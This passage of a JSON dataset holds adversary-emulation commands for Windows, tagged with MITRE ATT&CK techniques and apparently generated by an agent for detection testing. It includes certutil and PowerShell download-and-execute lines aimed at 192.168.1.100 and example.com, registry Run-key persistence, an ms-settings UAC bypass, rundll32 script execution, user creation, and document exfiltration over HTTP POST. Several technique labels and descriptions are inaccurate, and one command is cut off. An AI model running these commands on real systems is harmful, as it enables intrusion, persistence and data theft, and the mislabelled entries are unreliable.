      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6561618f-06b1-4824-99f0-38a06e770967",
      "ttp_id": "unknown",
      "technique_id": "T1105",
      "technique_name": "Loader",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -split -f http://192.168.1.100/xrat.bin %TEMP%\\\\loader.bin",
      "description": "Download encoded payload using certutil, a built-in Windows binary commonly abused for file retrieval",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to download a binary from a remote server and save it to the TEMP directory. Will fail silently if network is unreachable or URL is invalid.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.408351",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "37f15e90-1675-4051-94c2-90b45eab6cc5",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Loader",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/loader.ps1')\"",
      "description": "Download and execute a PowerShell script from a remote server using WebClient",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Fetches and immediately executes a remote PowerShell script in memory. Leaves minimal disk artifacts but generates network and script block logging events.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.408351",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "9f430d39-a7e8-4dbd-b807-b5af741e52dd",
      "ttp_id": "unknown",
      "technique_id": "T1547.001",
      "technique_name": "Loader",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v Loader /t REG_SZ /d \"%TEMP%\\\\loader.bin\" /f",
      "description": "Persistence via Run key using reg.exe to execute loader on user login",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Adds a registry entry to execute the downloaded binary at user logon. Uses built-in reg.exe for stealth and compatibility.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:53.408351",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "32bab9a7-887f-445c-ba84-e21475b7a252",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";eval(\"alert('Amadey test via Rundll32');\")",
      "description": "Simulates Amadey malware execution via Rundll32.exe abusing JavaScript execution through MSHTML",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Rundll32 spawns and attempts to execute embedded JavaScript; may trigger JS-based detection rules; no actual malware is downloaded or executed",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:22.111041",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "b8e284a5-a4b0-43d1-adeb-6ce0f7f16d1d",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe %TEMP%\\malicious.dll,EntryPoint",
      "description": "Simulates execution of a malicious DLL via Rundll32 to mimic Amadey payload activation",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Rundll32 attempts to load and execute a DLL from %TEMP%; in real attacks this would be a staged payload; here, the file does not exist, so it fails silently",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:22.111041",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "abc05c5c-4bb5-4cb8-9819-201d21354137",
      "ttp_id": "unknown",
      "technique_id": "T1059.001",
      "technique_name": "Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwByAGkAdABlAC0ASABvAHMAdAAgACcAQQBtAGEAZABlAHkAIAB0AGUAcwB0ACAAdgBpAGEAIABFAG4AYwBvAGQAZQBkAEMAbwBtAG0AYQBuAGQAIAAoAFQAMQAwADUAOQAuADAAMAExACkAJwApAA==')));\"",
      "description": "Executes a Base64-encoded Unicode PowerShell command simulating Amadey's encoded command technique",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "PowerShell decodes and executes a UTF-16LE-encoded command displaying a test message; mimics obfuscated payload execution without network activity",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:22.111041",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "eadc7559-c194-48db-9d1d-9a16cff241e4",
      "ttp_id": "unknown",
      "technique_id": "T1548.003",
      "technique_name": "UAC Bypass",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Add-Type -TypeDefinition '[DllImport(\"user32.dll\")]public class UACBypass{[DllImport(\"user32.dll\")]public static extern bool ChangeWindowMessageFilterEx(IntPtr hWnd, uint message, uint action, ref uint pChangeFilterStruct);}'\"",
      "description": "Load UAC Bypass type definition into PowerShell",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Loads the UAC Bypass type definition into PowerShell without executing it",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.778923",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a52632d0-04d8-4bc9-af5e-282ac6aa44af",
      "ttp_id": "unknown",
      "technique_id": "T1548.003",
      "technique_name": "UAC Bypass",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[UACBypass]::ChangeWindowMessageFilterEx((Get-Process -Id $PID).MainWindowHandle, 0x112, 1, [ref]0)\"",
      "description": "Execute UAC Bypass using the loaded type definition",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Attempts to bypass UAC using the ICMLuaUtil interface",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.778923",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "7c82b0d9-763b-40d2-827e-d51443a2ed3b",
      "ttp_id": "unknown",
      "technique_id": "T1548.003",
      "technique_name": "UAC Bypass",
      "tactic": "execution",
      "platform": "windows",
      "command": "reg add \"HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command\" /ve /d \"powershell -Command \"Write-Host 'UAC Bypass Test'\"\" /f",
      "description": "Create a registry key to bypass UAC using the ms-settings protocol",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Creates a registry key that can be used to bypass UAC when the ms-settings protocol is invoked",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.778923",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5f9173f1-25f0-48ec-91c6-f98e4595a138",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'AutoIt Script Execution Test'\"",
      "description": "Basic detection of AutoIt script execution using Write-Host",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'AutoIt Script Execution Test' to the console",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.372754",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "44bcafd2-6ba3-4c2e-b306-195decb948ab",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/autiot_script.au3 %TEMP%\\autiot_script.au3 && %TEMP%\\autiot_script.au3",
      "description": "Intermediate detection of AutoIt script execution using certutil and URL cache",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads an AutoIt script from a URL and executes it",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.372754",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c916a1aa-4276-447b-a996-1d68c52fb354",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Execution",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Diagnostics.Process]::Start('%TEMP%\\autiot_script.exe')\"",
      "description": "Advanced detection of AutoIt script execution using PowerShell and Process Start",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Executes an AutoIt script using the Process Start method",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.372754",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "575340f2-7363-4f2c-86f4-dd4c9d986321",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Use of Known Utilities",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil.exe -urlcache -f http://example.com/test.txt %TEMP%\\test.txt",
      "description": "Downloads a file using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.293331",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "89b45613-5575-499d-bceb-12a3da42fbd1",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Use of Known Utilities",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'Test'\"",
      "description": "Executes a simple PowerShell command",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'Test' to the console",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.293331",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8d9c0389-d16b-4613-8994-38b647d47a67",
      "ttp_id": "unknown",
      "technique_id": "T1136",
      "technique_name": "Use of Known Utilities",
      "tactic": "execution",
      "platform": "windows",
      "command": "net.exe user /add testuser testpass",
      "description": "Adds a new user using net.exe",
      "requires_admin": true,
      "safety_level": "high",
      "expected_behavior": "Adds a new user to the system",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.293331",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a722857f-fda1-46fe-b181-fc0062a74c72",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "AutoIt",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'AutoIt Test'\"",
      "description": "Basic AutoIt detection test using Write-Host",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Prints 'AutoIt Test' to the console",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.378737",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "60f82e0c-199b-499e-9331-64ec1cad650c",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "AutoIt",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/autiot.exe %TEMP%\\autiot.exe && %TEMP%\\autiot.exe",
      "description": "Intermediate AutoIt test using certutil to download and execute a file",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads and executes a file from a URL",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.378737",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c16137f7-39ae-4cdf-b08d-fd21df536bb5",
      "ttp_id": "unknown",
      "technique_id": "unknown",
      "technique_name": "AutoIt",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.Diagnostics.Process]::Start('cmd.exe', '/c', 'echo AutoIt > %TEMP%\\autiot.txt')\"",
      "description": "Advanced AutoIt test using PowerShell to create a file",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a file named autiot.txt in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.378737",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "e24a53f2-116d-407e-ab7a-7c59cec09fde",
      "ttp_id": "unknown",
      "technique_id": "T1204.002",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WScript.Shell\");h.Run(\"cmd.exe /c start iexplore.exe && ping -n 3 127.0.0.1 && rundll32.exe C:\\\\Windows\\\\System32\\\\calc.dll,OpenCalculator\"),close()",
      "description": "Abuse Rundll32 to execute JavaScript in Windows context, spawn iexplore.exe, then inject benign action via second Rundll32 call.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Rundll32.exe spawns iexplore.exe, short delay, then opens calculator. Mimics initial execution and process injection pattern using trusted binaries.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:23.826909",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "35814719-f0fa-45ae-8713-c1736cbad10b",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"try { $content = \\\"Start-Process iexplore.exe; Start-Sleep -Seconds 2; Get-Process iexplore | ForEach-Object { $code = [System.Text.Encoding]::UTF8.GetBytes('calc.exe'); [System.Reflection.Assembly]::LoadWithPartialName('System.Core') | Out-Null; $handle = [System.Runtime.InteropServices.GCHandle]::Alloc($code, [System.Runtime.InteropServices.GCHandleType]::Pinned); $addr = $handle.AddrOfPinnedObject(); $handle.Free() } \\\"; $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($content)); Start-Process 'rundll32.exe' -ArgumentList 'javascript:\"\\\\..\\\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\\\"WScript.Shell\\\");h.Run(\\\"powershell -EncodedCommand $encoded\\\"),close()' -WindowStyle Hidden } catch { exit 1 }\"",
      "description": "Simulate Amadey-like behavior: Rundll32 executes PowerShell via encoded command to launch iexplore.exe and simulate injection into it using reflective loading pattern (benign calc.exe).",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Rundll32 spawns iexplore.exe via PowerShell, waits, then simulates injection by preparing code in memory (calc.exe). No actual injection occurs. Uses only built-in tools and proper Base64 encoding (UTF-16LE).",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:23.826909",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "ef287949-c8ca-495b-927e-9c8efa412558",
      "ttp_id": "unknown",
      "technique_id": "T1055",
      "technique_name": "Process Injection",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd.exe /c \"set temp_file=%TEMP%\\\\inject.tmp && echo calc.exe > \"%temp_file%\" && start iexplore.exe && ping -n 3 127.0.0.1 > nul && for /f \\\"tokens=2\\\" %i in ('tasklist /fi \\\"imagename eq iexplore.exe\\\" ^| find \\\"iexplore\\\"') do rundll32.exe %TEMP%\\\\\\inject.tmp,RunFromReg %i\" && del \"%temp_file%\" /q 2>nul",
      "description": "Simulate file-based injection: write benign payload to temp, launch iexplore.exe, find its PID, and simulate injection via rundll32 loading from file.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Creates temporary file with benign content, starts iexplore.exe, finds its PID, and calls rundll32 to 'load' the temp file as if injecting. Cleanup is attempted silently. Uses only native Windows binaries.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:24:23.826909",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "feea665d-c168-48de-a698-a5f433bef810",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Data Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path 'C:\\\\\\Users\\\\\\\\Public\\\\\\\\Documents\\\\\\\\example.txt' -DestinationPath '%TEMP%\\\\\\\\exfiltrated_data.zip' -Force\"",
      "description": "Exfiltrate data using Compress-Archive",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a zip archive of the specified file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.293331",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "887ed157-eeef-4b4c-8f0c-6eea200034db",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Data Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/malicious_file.exe %TEMP%\\\\\\\\malicious_file.exe",
      "description": "Exfiltrate data using certutil",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Downloads a file from the specified URL to the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.293331",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "69e0c8b2-2488-4cb3-9acd-859ba7912729",
      "ttp_id": "unknown",
      "technique_id": "T1204",
      "technique_name": "Data Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path '%TEMP%\\\\\\\\exfiltrated_data.txt' -Value 'Sensitive data' -Force\"",
      "description": "Exfiltrate data using Set-Content",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Creates a text file with sensitive data in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.294841",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "58e154f4-ccd2-44d3-b6fd-37c07a40bc1e",
      "ttp_id": "unknown",
      "technique_id": "T1568.001",
      "technique_name": "Domain Generation Algorithms",
      "tactic": "execution",
      "platform": "windows",
      "command": "cmd /c \"for /L %i in (1,1,5) do @set /a r=%random% && @echo test%r%.com\"",
      "description": "Generates a short list of pseudo\u2011random domain names using the built\u2011in cmd loop and echoes them to the console. Useful for testing DGA detection logic without network activity.",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Outputs five domain strings such as test12345.com to STDOUT; no files are written and no network connections are made.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:24.471267",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cf753888-554f-43d3-8554-eea4b75dd7ce",
      "ttp_id": "unknown",
      "technique_id": "T1568.001",
      "technique_name": "Domain Generation Algorithms",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"$seed = (Get-Date).ToString('yyyyMMdd'); $domains = 1..10 | ForEach-Object { $hash = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($seed + $_))) -replace '-',''; $domain = $hash.Substring(0,12) + '.net'; $domain }; $domains\"",
      "description": "PowerShell generates ten deterministic pseudo\u2011random domains based on the current date, emulating a simple DGA algorithm.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Prints ten domain names (e.g., a1b2c3d4e5f6.net) to the console; no external resources are accessed.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:24.471267",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "6de990ef-c892-4fae-b7f6-79139f34b3e5",
      "ttp_id": "unknown",
      "technique_id": "T1568.001",
      "technique_name": "Domain Generation Algorithms",
      "tactic": "execution",
      "platform": "windows",
      "command": "schtasks /Create /SC HOURLY /TN \\\"DGATask\\\" /TR \\\"powershell -Command \\\"$seed = (Get-Date).ToString('yyyyMMddHH'); $domains = 1..20 | ForEach-Object { $hash = [System.BitConverter]::ToString((New-Object System.Security.Cryptography.SHA256Managed).ComputeHash([System.Text.Encoding]::UTF8.GetBytes($seed + $_))) -replace '-',''; $domain = $hash.Substring(0,12) + '.org'; Add-Content -Path $env:TEMP\\\\dga_domains.txt -Value $domain }\\\"\\\"",
      "description": "Creates a scheduled task that runs hourly, generating twenty DGA\u2011style domains and appending them to a file in %TEMP%. Demonstrates persistence of DGA activity.",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A scheduled task named 'DGATask' is registered; each hour it writes domain strings to %TEMP%\\dga_domains.txt. No network traffic is initiated.",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:24.471267",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "629010cf-2265-414f-b76f-5f15318bb5a3",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Start-Process 'cmd.exe' -ArgumentList '/c', 'echo Hello World > %TEMP%\\test.txt'}\"",
      "description": "Office process spawns command shell to create a file",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A command shell is spawned and creates a file in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.327494",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "d3c66dc3-efa7-45c4-8bde-d8fa80d0a51b",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Start-Process 'cmd.exe' -ArgumentList '/c', 'certutil -f -decode %TEMP%\\test.txt %TEMP%\\test2.txt'}\"",
      "description": "Office process spawns command shell to decode a file using certutil",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A command shell is spawned and decodes a file using certutil",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.327494",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "5a26a1b9-86d3-497d-94db-cc5604f35e2c",
      "ttp_id": "unknown",
      "technique_id": "T1566",
      "technique_name": "Phishing",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"& {Start-Process 'cmd.exe' -ArgumentList '/c', 'powershell -Command \\",
      "description": "Office process spawns command shell to execute a PowerShell command",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "A command shell is spawned and executes a PowerShell command",
      "source": "langchain",
      "generated_at": "2025-12-23T04:22:19.327494",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "50419e45-fd8e-4238-abd8-a26ba537237c",
      "ttp_id": "unknown",
      "technique_id": "T1036",
      "technique_name": "Masquerading",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -urlcache http://example.com/benign.exe %TEMP%\\benign.exe && %TEMP%\\benign.exe",
      "description": "Downloads a benign executable using certutil and executes it",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "The benign executable will be downloaded and executed",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.478899",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "c3549c70-74e5-4c1d-87c4-d9d42c714094",
      "ttp_id": "unknown",
      "technique_id": "T1059",
      "technique_name": "Masquerading",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Write-Host 'Test'; Start-Process -FilePath 'C:\\\\Windows\\\\System32\\\\notepad.exe'\"",
      "description": "Executes a PowerShell command that writes to the console and starts notepad",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Notepad will be started and 'Test' will be written to the console",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.478899",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "cfdb818f-e474-4b75-85c7-554ce303b1fe",
      "ttp_id": "unknown",
      "technique_id": "T1036",
      "technique_name": "Masquerading",
      "tactic": "execution",
      "platform": "windows",
      "command": "copy /y %TEMP%\\benign.exe C:\\\\Windows\\\\System32\\\\benign.exe",
      "description": "Copies a benign executable to the System32 directory",
      "requires_admin": true,
      "safety_level": "medium",
      "expected_behavior": "The benign executable will be copied to the System32 directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:21:18.478899",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "a2d7c4f9-973d-4f57-9818-86ed590afce9",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"[System.IO.Compression.CompressionLevel]::Optimal; Compress-Archive -Path '%TEMP%\\test.txt' -DestinationPath '%TEMP%\\test.zip' -CompressionLevel Optimal -Force\"",
      "description": "Compress a test file to evade detection",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "A zip file will be created in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.070106",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8e5f7aa3-4562-4423-94bd-18b00f9a2906",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -f -encode '%TEMP%\\test.txt' '%TEMP%\\test-encoded.txt'",
      "description": "Encode a test file to evade detection",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "An encoded file will be created in the temp directory",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.070106",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8371bf19-388e-4e1f-a64e-cdb9b68fc004",
      "ttp_id": "unknown",
      "technique_id": "T1027",
      "technique_name": "Obfuscated Files or Information",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path '%TEMP%\\test-obfuscated.txt' -Value 'SGVsbG8gd29ybGQh' -Encoding UTF8 -Force; Get-Content -Path '%TEMP%\\test-obfuscated.txt'\"",
      "description": "Create an obfuscated file and read its contents",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "An obfuscated file will be created and its contents will be printed to the console",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.070106",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "df1768e1-3771-408b-b578-9d06431db011",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Data Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Compress-Archive -Path C:\\\\Users\\\\Public\\\\Documents\\\\* -DestinationPath %TEMP%\\\\exfil.zip -Force; Invoke-WebRequest -Uri http://example.com/exfil -Method Post -Body (Get-Content %TEMP%\\\\exfil.zip -Raw)\"",
      "description": "Exfiltrate documents via HTTP POST",
      "requires_admin": false,
      "safety_level": "medium",
      "expected_behavior": "Archive documents and send via HTTP POST",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.984274",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "bf3aa691-7ca9-46d5-aab7-19e23bd87f9a",
      "ttp_id": "unknown",
      "technique_id": "T1190",
      "technique_name": "Data Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "certutil -urlcache -f http://example.com/malware.exe %TEMP%\\\\malware.exe && %TEMP%\\\\malware.exe",
      "description": "Download and execute malware",
      "requires_admin": false,
      "safety_level": "high",
      "expected_behavior": "Download and execute malware",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.984274",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "8eabf303-4add-492e-9969-ff317dc07e27",
      "ttp_id": "unknown",
      "technique_id": "T1041",
      "technique_name": "Data Exfiltration",
      "tactic": "execution",
      "platform": "windows",
      "command": "powershell -Command \"Set-Content -Path %TEMP%\\\\data.txt -Value 'Test data'; Invoke-WebRequest -Uri http://example.com/exfil -Method Post -Body (Get-Content %TEMP%\\\\data.txt -Raw)\"",
      "description": "Exfiltrate test data via HTTP POST",
      "requires_admin": false,
      "safety_level": "low",
      "expected_behavior": "Send test data via HTTP POST",
      "source": "langchain",
      "generated_at": "2025-12-23T04:23:20.984861",
      "agent_id": "6d8a3fb2-a2aa-4f24-9484-670011c75123",
      "confidence_score": 0.8,
      "validated": true
    },
    {
      "id": "4ce71d73-42fa-4885-b5d2-5561ec35beb4",
      "ttp_id": "unknown",
      "technique_id": "T1059",
